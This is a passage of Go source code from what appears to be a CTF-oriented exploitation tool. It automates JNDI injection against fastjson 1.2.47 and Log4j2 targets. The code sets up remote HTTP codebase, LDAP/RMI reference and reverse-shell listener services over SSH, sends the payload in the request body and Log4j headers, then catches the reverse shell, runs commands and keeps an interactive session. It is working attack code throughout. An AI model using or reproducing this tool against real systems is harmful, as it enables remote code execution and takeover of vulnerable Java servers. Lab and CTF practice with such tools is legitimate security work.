			fmt.Sprintf("cd %s && %s %s.java 2>&1", p.workdir, javacBin, p.clsName), 60*time.Second)
	}
	if code != 0 {
		return fmt.Errorf("javac 编译失败:\n%s", truncRunes(strings.TrimSpace(out+errS), 500))
	}
	note(fmt.Sprintf("      编译成功: %s/%s.class（--release 8，兼容 Java 8 靶机）", p.workdir, p.clsName))

	// [4] 启动服务
	refLabel := "LDAP"
	if p.isRMI {
		refLabel = "RMI"
	}
	note(fmt.Sprintf("[4/7] 启动 HTTP/%d、%s/%d、反弹监听/%d ...", p.httpPort, refLabel, p.refPort, p.lport))
	note("      请确保服务器防火墙/安全组放行上述端口入站")
	// 反弹监听白名单 = 靶机出口 IP：工具自身的公网探测、安全组探测、
	// 端口扫描器连上时一律拒绝，避免 nc 单连接语义下探测连接“抢走”
	// 唯一 shell 会话槽位、真实回连被 RST 的竞态。
	allowIP := ""
	if p.targetURL != "" {
		if u, err := url.Parse(p.targetURL); err == nil && u.Hostname() != "" {
			if addrs, err := net.LookupHost(u.Hostname()); err == nil && len(addrs) > 0 {
				allowIP = addrs[0]
			}
		}
	}
	// 注意：不要用 `cd X && nohup ... &` 这种后台 AND-列表——
	// bash 对其走 subshell 路径，子进程会占住 SSH channel fd，
	// 远端 shell 退出后等不到 EOF 一直挂到超时（PID 也拿不到）。
	// 全部改用绝对路径 / --directory，后台只放单个 nohup 命令。
	javaBin := core.ToolPath("java")     // 远程 java 命令/路径，可在设置页配置
	pythonBin := core.ToolPath("python3") // 远程 python3 命令/路径，可在设置页配置
	refCmds := []string{fmt.Sprintf(
		"nohup %s %s/ldap_server.py 0.0.0.0 %d %s %s </dev/null >%s/ldap.log 2>&1 & echo $!",
		pythonBin, p.workdir, p.ldapPort, p.codebase, p.clsName, p.workdir)}
	if p.isRMI {
		// RMI 运行参数与编译同构：JDK 17+ / JDK 9-16 / JDK 8 逐级回退
		// （java 对未知模块的 --add-exports 会直接报错退出）
		refCmds = []string{
			fmt.Sprintf(
				"nohup %s --add-modules jdk.naming.rmi "+
					"--add-exports jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED "+
					"--add-opens jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED "+
					"-cp %s RMIServer %d %s %s </dev/null >%s/rmi.log 2>&1 & echo $!",
				javaBin, p.workdir, p.rmiPort, p.codebase, p.clsName, p.workdir),
			fmt.Sprintf(
				"nohup %s --add-exports java.naming/com.sun.jndi.rmi.registry=ALL-UNNAMED "+
					"--add-opens java.naming/com.sun.jndi.rmi.registry=ALL-UNNAMED "+
					"-cp %s RMIServer %d %s %s </dev/null >%s/rmi.log 2>&1 & echo $!",
				javaBin, p.workdir, p.rmiPort, p.codebase, p.clsName, p.workdir),
			fmt.Sprintf(
				"nohup %s -cp %s RMIServer %d %s %s </dev/null >%s/rmi.log 2>&1 & echo $!",
				javaBin, p.workdir, p.rmiPort, p.codebase, p.clsName, p.workdir),
		}
	}
	type startCmd struct {
		name       string
		candidates []string
	}
	startCmds := []startCmd{
		{"http", []string{fmt.Sprintf(
			"nohup %s -m http.server %d --bind 0.0.0.0 "+
				"--directory %s </dev/null >%s/http.log 2>&1 & echo $!",
			pythonBin, p.httpPort, p.workdir, p.workdir)}},
		{jndiRefSvcName(p.isRMI), refCmds},
		// 用 3<> 以 O_RDWR 打开 fifo 并挂在 fd 3：O_RDWR 打开永不
		// 阻塞、立即返回，保证 echo $! 能输出 PID。
		// 关键：<> 只作用于 fd 0，若写成 `<>fifo </dev/null ...`，
		// 后面的 </dev/null 会把 fd 0 换成 /dev/null、关闭 fifo 的
		// fd —— sleep 实际不持有 fifo，监听器的只读打开会因无写者
		// 永久阻塞、永不监听。挂 fd 3 则后续对 0/1/2 的重定向都
		// 碰不到它。
		// 0/1/2 也必须全部重定向：否则 sleep 继承 SSH channel fd，
		// bash 退出后 sshd 等不到 EOF，客户端挂到超时、PID 丢失。
		{"fifo", []string{fmt.Sprintf(
			"mkfifo %s/rev.fifo; "+
				"nohup sleep 999999 3<>%s/rev.fifo </dev/null >/dev/null 2>&1 & echo $!",
			p.workdir, p.workdir)}},
		{"listener", []string{fmt.Sprintf(
			"nohup %s %s/reverse_listener.py 0.0.0.0 %d "+
				"%s/rev.fifo %s/rev.out %s "+
				"</dev/null >/dev/null 2>>%s/rev.out & echo $!",
			pythonBin, p.workdir, p.lport, p.workdir, p.workdir, allowIP, p.workdir)}},
	}
	for _, sc := range startCmds {
		started := false
		for _, cmd := range sc.candidates {
			_, out, _ := client.exec(ctx, cmd, 60*time.Second)
			if strings.TrimSpace(out) != "" {
				lines := strings.Split(strings.TrimSpace(out), "\n")
				st.pids[sc.name] = lines[len(lines)-1]
			} else {
				st.pids[sc.name] = ""
			}
			if len(sc.candidates) == 1 {
				started = true
				break
			}
			// RMI 多候选：启动后以端口监听为准判定成败，失败换下一候选
			time.Sleep(2 * time.Second)
			_, chk, _ := client.exec(ctx,
				fmt.Sprintf("ss -tln 2>/dev/null | grep -E ':%d ' || true", p.rmiPort), 60*time.Second)
			if strings.TrimSpace(chk) != "" {
				started = true
				break
			}
		}
		if !started {
			return fmt.Errorf("%s 服务启动失败（端口 %d 未监听，详见 %s/%s.log）", sc.name, p.rmiPort, p.workdir, sc.name)
		}
	}
	time.Sleep(2 * time.Second)
	code, out, _ = client.exec(ctx,
		fmt.Sprintf("ss -tln 2>/dev/null | grep -E ':(%d|%d|%d) ' || true", p.httpPort, p.refPort, p.lport),
		60*time.Second)
	listenStatus := strings.TrimSpace(out)
	if listenStatus == "" {
		listenStatus = "（ss 不可用，跳过校验）"
	}
	note("      监听状态: " + listenStatus)
	// 云安全组/防火墙可能拦入站：从本机（与靶机同方向）直连验证
	ext := jndiCheckExternal(p.lhost, []int{p.httpPort, p.refPort, p.lport}, 3*time.Second)
	blocked := false
	var extParts []string
	for _, port := range []int{p.httpPort, p.refPort, p.lport} {
		if ext[port] != "OK" {
			blocked = true
		}
		extParts = append(extParts, fmt.Sprintf("%d: %s", port, ext[port]))
	}
	if blocked {
		note("      外部可达性: " + strings.Join(extParts, " | ") + "（请放行安全组/防火墙入站）")
	} else {
		note(fmt.Sprintf("      外部可达性: 本机直连 HTTP/%s/反弹端口全部 OK", refLabel))
	}

	// [5] 生成 PoC
	note(fmt.Sprintf("[5/7] 生成 PoC（触发模板: %s）...", p.trigger))
	pocRaw, curlCmd, poc, headerNames, err := jndiBuildPoc(p)
	if err != nil {
		return err
	}
	st.poc = poc
	st.pocRaw = pocRaw
	st.curlCmd = curlCmd
	note(fmt.Sprintf("      JNDI: %s（%s）", p.jndiURL, p.jndiProtocol))
	note(fmt.Sprintf("      CodeBase: %s", p.codebase))
	note(fmt.Sprintf("      类名: %s（每次运行随机化，规避目标 JVM 同名类缓存）", p.clsName))

	// [6] 发送 PoC
	if p.targetURL != "" {
		note("[6/7] 确认反弹监听就绪后 POST PoC ...")
		if jndiWaitListen(ctx, client, p.lport, jndiPostWaitListenTimeout) {
			note(fmt.Sprintf("      监听器已在 %d 就绪，可以发送", p.lport))
		} else {
			note(fmt.Sprintf("      监听器未在 %d 就绪（回连将被 RST），仍继续发送", p.lport))
		}
		if p.isLog4j {
			note(fmt.Sprintf("[6/7] POST PoC（请求头注入: %s + body）-> %s ...", strings.Join(headerNames, ", "), p.targetURL))
			respStatus, respBody, ok := jndiPost(p.targetURL, st.pocRaw,
				jndiLog4jHeaderMap(headerNames, st.pocRaw), "text/plain", 15*time.Second)
			st.setHTTPResp(respStatus, respBody, ok)
		} else {
			note(fmt.Sprintf("[6/7] POST PoC -> %s ...", p.targetURL))
			respStatus, respBody, ok := jndiPost(p.targetURL, st.pocRaw, nil, "application/json", 15*time.Second)
			st.setHTTPResp(respStatus, respBody, ok)
		}
		if st.httpResp["status_code"] != nil {
			note(fmt.Sprintf("      响应: %v %s", st.httpResp["status_code"], truncRunes(fmt.Sprint(st.httpResp["body"]), 200)))
		} else {
			note("      响应: 异常 " + truncRunes(fmt.Sprint(st.httpResp["error"]), 200))
		}
		note("      （fastjson 场景下 'set property error, autoCommit' 属预期回显）")
	} else {
		note("[6/7] 未提供 target_url，跳过自动发送（请手动发送 PoC）")
	}

	// [7] 等待反弹连接并执行命令
	note(fmt.Sprintf("[7/7] 等待反弹 shell 连接（≤%ds）...", p.waitTime))
	connected := jndiWaitConnection(ctx, client, p.lport, time.Duration(p.waitTime)*time.Second)
	if connected {
		note(fmt.Sprintf("      收到连接！下发命令: %s", p.command))
		jndiSendCommand(ctx, client, p.workdir, p.command)
		time.Sleep(5 * time.Second)
		st.shellOutput = jndiReadOutput(ctx, client, p.workdir)
		if p.interactive && tc.Sessions != nil {
			sh := &jndiShell{
				client:  client,
				workdir: p.workdir,
				pids:    copyStrMap(st.pids),
				note:    note,
				refSvc:  jndiRefSvcName(p.isRMI),
			}
			sh.setup(ctx)
			sess := tc.Sessions.Create(
				func(ctx context.Context, command string, timeout time.Duration) (string, bool, bool) {
					return sh.execCommand(ctx, command, timeout)
				},
				func(ctx context.Context) error {
					sh.close(ctx)
					return nil
				},
			)
			st.sessionID = sess.ID
			st.keepSession = true
			note(fmt.Sprintf("      交互会话已建立: %s（前端可继续下发命令，关闭会话时自动清理远程环境）", st.sessionID))
		}
	} else if p.targetURL != "" {
		// 盲发前先确认监听器仍在监听；否则 >rev.fifo 无读者会阻塞到超时
		if jndiWaitListen(ctx, client, p.lport, jndiBlindWaitListenTimeout) {
			note("      未探测到连接（可能缺 ss/netstat），盲发命令验证 ...")
			jndiSendCommand(ctx, client, p.workdir, p.command)
			time.Sleep(5 * time.Second)
			st.shellOutput = jndiReadOutput(ctx, client, p.workdir)
			// rev.out 混有监听器自身日志（banner/拒绝记录），必须剔除
			// 后再判断是否真的收到了命令输出，否则恒为“有输出”假阳性
			var realLines []string
			for _, ln := range strings.Split(st.shellOutput, "\n") {
				if !jndiListenerLogRe.MatchString(ln) {
					realLines = append(realLines, ln)
				}
			}
			connected = strings.TrimSpace(strings.Join(realLines, "\n")) != ""
		} else {
			note("      监听器未在监听，跳过盲发（回连从未建立）")
		}
	}
	st.connected = connected
	if !connected {
		note("      超时未收到连接（检查靶机 JDK 版本 / 出网策略 / 端口是否可达）")
		if p.isRMI {
			note("      RMI 提示: 目标 JDK 8u121+ 默认禁用 RMI 远程类加载" +
				"（com.sun.jndi.rmi.object.trustURLCodebase=false），" +
				"若 LDAP 可用优先换 LDAP；仅当确认目标允许 RMI codebase 时用本协议")
		}
		if body, ok := st.httpResp["body"].(string); ok && strings.Contains(body, "type not match") {
			note("      响应含 type not match: 目标应用把根 JSON 绑定到了具体类，" +
				"根级 @type 注入无效，请换 fastjson_1.2.47 嵌套模板或 custom 自定义")
		}
		refLog := "ldap.log"
		if p.isRMI {
			refLog = "rmi.log"
		}
		diagCode, diagOut, _ := client.exec(ctx, fmt.Sprintf(
			"echo ==%s==; tail -n 5 %s/%s 2>/dev/null; "+
				"echo ==http.log==; tail -n 5 %s/http.log 2>/dev/null; "+
				"echo ==rev.out==; cat %s/rev.out 2>/dev/null",
			refLog, p.workdir, refLog, p.workdir, p.workdir), 30*time.Second)
		if diagCode == 0 {
			note("      服务日志诊断:\n" + truncRunes(strings.TrimSpace(diagOut), 800))
		}
	}

	if connected || p.targetURL == "" {
		st.status = core.StatusSuccess
	} else {
		st.status = core.StatusError
		st.stderr = "未收到反弹 shell 连接，PoC 已生成（见输出中的 PoC 与 curl 命令）"
	}
	return nil
}

func jndiLog4jHeaderMap(names []string, pocRaw string) map[string]string {
	m := map[string]string{}
	for _, h := range names {
		m[h] = pocRaw
	}
	return m
}

func (st *jndiState) setHTTPResp(status int, body string, ok bool) {
	if ok {
		st.httpResp = map[string]any{"status_code": status, "body": body}
	} else {
		st.httpResp = map[string]any{"error": body}
	}
}

// cleanupRemote 对应 Python run() 的 finally 清理块。
func (st *jndiState) cleanupRemote(ctx context.Context, client jndiExecer, note func(string), p jndiParamsX) {
	// 公网 SSH 存在瞬断，kill 需重试；启动前已验证端口空闲，
	// 若仍残留监听则按 ss -tlnp 精确补杀（只可能是本轮部署的进程）。
	portsPat := fmt.Sprintf(":(%d|%d|%d) ", p.httpPort, p.refPort, p.lport)
	for attempt := 0; attempt < 4; attempt++ {
		var targets []string
		for _, pid := range st.pids {
			if pid != "" {
				targets = append(targets, pid)
			}
		}
		if killTargets := strings.Join(targets, " "); killTargets != "" {
			client.exec(ctx, fmt.Sprintf("kill %s 2>/dev/null || true", killTargets), 20*time.Second)
		}
		time.Sleep(1 * time.Second)
		code, out, _ := client.exec(ctx,
			fmt.Sprintf("ss -tlnp 2>/dev/null | grep -E '%s' || true", portsPat), 20*time.Second)
		if code != 0 {
			continue // 检查本身因瞬断失败，重试而非误判“已干净”
		}
		var leftovers []string
		for _, ln := range strings.Split(out, "\n") {
			if strings.TrimSpace(ln) != "" {
				leftovers = append(leftovers, ln)
			}
		}
		if len(leftovers) == 0 {
			break
		}
		// 从 ss 输出提取 pid=NNN 补杀
		var stray []string
		for _, m := range jndiPidRe.FindAllStringSubmatch(out, -1) {
			stray = append(stray, m[1])
		}
		if len(stray) == 0 {
			break
		}
		st.pids["stray"] = strings.Join(stray, " ")
		note(fmt.Sprintf("[cleanup] 残留监听（第%d次），补杀: %s", attempt+1, strings.Join(stray, ", ")))
	}
	// fifo 保活的 sleep 与 python 监听器无监听 socket 时 ss 抓不到；
	// 用正则字符类写模式串，避免 pkill -f 匹配到本命令自身
	// （命令里是字面 'sleep 999[9]99'，正则不会命中自己）
	client.exec(ctx,
		"pkill -f 'sleep 999[9]99' 2>/dev/null; "+
			"pkill -f 'reverse_listene[r]' 2>/dev/null || true", 20*time.Second)
	client.exec(ctx, fmt.Sprintf("rm -rf %s", p.workdir), 20*time.Second)
	// 终验：如实报告清理结果
	code, out, _ := client.exec(ctx,
		fmt.Sprintf("ss -tlnp 2>/dev/null | grep -E '%s' || true", portsPat), 20*time.Second)
	if code == 0 && strings.TrimSpace(out) == "" {
		note("[cleanup] 已清理远程进程与工作目录")
	} else {
		note("[cleanup] 清理完成但端口仍有残留:\n" + truncRunes(strings.TrimSpace(out), 300))
	}
}

// run 对应 Python JndiExploitTool.run。
func (t *jndiTool) run(ctx context.Context, params map[string]any, tc *core.ToolContext) (*core.ToolResult, error) {
	p := jndiParamsX{
		sshHost:        strings.TrimSpace(paramStr(params, "ssh_host")),
		sshPort:        jndiIntOr(params, "ssh_port", 22),
		sshUser:        strings.TrimSpace(paramStr(params, "ssh_user")),
		sshPass:        paramStr(params, "ssh_pass"),
		puttyDir:       strings.TrimSpace(paramStr(params, "putty_dir")),
		lhost:          strings.TrimSpace(paramStr(params, "lhost")),
		ldapPort:       jndiIntOr(params, "ldap_port", 1389),
		jndiProtocol:   strings.ToLower(strings.TrimSpace(paramStr(params, "jndi_protocol"))),
		rmiPort:        jndiIntOr(params, "rmi_port", 1099),
		httpPort:       jndiIntOr(params, "http_port", 8888),
		lport:          jndiIntOr(params, "lport", 31339),
		targetURL:      strings.TrimSpace(paramStr(params, "target_url")),
		trigger:        jndiStrOr(params, "trigger", "fastjson_1.2.47"),
		customTemplate: strings.TrimSpace(paramStr(params, "custom_template")),
		log4jHeader:    jndiStrOr(params, "log4j_header", jndiLog4jDefaultHeader),
		command:        jndiStrOr(params, "command", "cat /flag"),
		gadget:         jndiStrOr(params, "gadget_class", jndiDefaultGadget),
		waitTime:       jndiIntOr(params, "wait_time", 60),
		cleanup:        jndiBool(params, "cleanup", true),
		interactive:    jndiBool(params, "interactive", true),
		shell:          jndiStrOr(params, "shell", "/bin/sh"),
	}
	if p.sshHost == "" || p.sshUser == "" {
		return nil, fmt.Errorf("RuntimeError: 缺少 SSH 连接信息（ssh_host/ssh_user），请在参数中填写或在「设置」页配置默认值")
	}
	if p.lhost == "" {
		p.lhost = p.sshHost
	}
	if p.jndiProtocol == "" {
		p.jndiProtocol = "ldap"
	}
	if p.waitTime < 5 {
		p.waitTime = 5
	}

	if p.jndiProtocol != "ldap" && p.jndiProtocol != "rmi" {
		return nil, fmt.Errorf("RuntimeError: 未知 jndi_protocol: %s（可选: ldap | rmi）", p.jndiProtocol)
	}
	p.isRMI = p.jndiProtocol == "rmi"
	if p.isRMI {
		p.refPort = p.rmiPort
	} else {
		p.refPort = p.ldapPort
	}
	p.isLog4j = p.trigger == "log4j2"

	p.clsName = jndiRandomClassName()
	p.codebase = fmt.Sprintf("http://%s:%d/", p.lhost, p.httpPort)
	if p.isRMI {
		p.jndiURL = fmt.Sprintf("rmi://%s:%d/%s", p.lhost, p.rmiPort, p.clsName)
	} else {
		p.jndiURL = fmt.Sprintf("ldap://%s:%d/%s", p.lhost, p.ldapPort, p.clsName)
	}
	p.workdir = fmt.Sprintf("/tmp/ctf-jndi-%d", time.Now().Unix())

	st := &jndiState{status: core.StatusError, pids: map[string]string{}}
	note := func(line string) { st.log = append(st.log, line) }
	note("已使用内置 Go SSH（不依赖 PuTTY，putty_dir 参数忽略）")

	tofuPath := jndiTOFUPath(tc)
	client := &jndiSSHClient{
		host:     p.sshHost,
		port:     p.sshPort,
		user:     p.sshUser,
		password: p.sshPass,
		store:    &jndiHostKeyStore{path: tofuPath, hosts: loadJndiHostKeys(tofuPath)},
	}

	if err := st.mainFlow(ctx, tc, client, note, p); err != nil {
		st.status = core.StatusError
		if st.stderr == "" {
			st.stderr = fmt.Sprintf("RuntimeError: %v", err)
		}
	}

	// finally：交互模式保留环境；否则按 cleanup 清理
	if st.keepSession {
		note("[cleanup] 交互模式：保留反弹监听/工作目录供会话使用（HTTP/引用服务已回收）")
	} else if p.cleanup {
		st.cleanupRemote(ctx, client, note, p)
	}

	// 汇总输出
	if st.shellOutput != "" {
		if m := jndiFlagRe.FindString(st.shellOutput); m != "" {
			st.flag = m
		}
	}

	lines := []string{"== JNDI 注入执行报告 ==", ""}
	lines = append(lines, st.log...)
	if st.pocRaw != "" {
		lines = append(lines, "",
			fmt.Sprintf("== PoC（%s）==", p.trigger),
			jndiJSONPretty(st.poc),
			"",
			"== 手动复现 ==",
			st.curlCmd)
	}
	if st.shellOutput != "" {
		lines = append(lines, "", "== 反弹 shell 输出 ==", strings.TrimRight(st.shellOutput, " \t\n\v\f\r"))
		if st.flag != "" {
			lines = append(lines, "", fmt.Sprintf("== FLAG: %s ==", st.flag))
		}
	}
	if !p.cleanup || st.sessionID != "" {
		pidsJSON, _ := json.Marshal(st.pids)
		lines = append(lines, "",
			"== 环境保留 ==",
			fmt.Sprintf("远程工作目录: %s", p.workdir),
			fmt.Sprintf("进程 PID: %s", pidsJSON))
		if st.sessionID != "" {
			lines = append(lines, fmt.Sprintf("交互会话 ID: %s（/api/sessions/%s/exec）", st.sessionID, st.sessionID))
		}
	}

	workdirVal := ""
	if st.sessionID != "" || !p.cleanup {
		workdirVal = p.workdir
	}
	var flagVal any
	if st.flag != "" {
		flagVal = st.flag
	}
	data := map[string]any{
		"poc":           st.pocRaw,
		"curl_cmd":      st.curlCmd,
		"class_name":    p.clsName,
		"trigger":       p.trigger,
		"jndi_protocol": p.jndiProtocol,
		"jndi_url":      p.jndiURL,
		"codebase":      p.codebase,
		"reverse_shell": fmt.Sprintf("socket %s:%d (%s)", p.lhost, p.lport, p.shell),
		"http_response": st.httpResp,
		"shell_output":  st.shellOutput,
		"connected":     st.connected,
		"flag":          flagVal,
		"session_id":    st.sessionID,
		"workdir":       workdirVal,
	}
	return &core.ToolResult{
		Status: st.status,
		Stdout: strings.Join(lines, "\n"),
		Stderr: st.stderr,
		Data:   data,
	}, nil
}
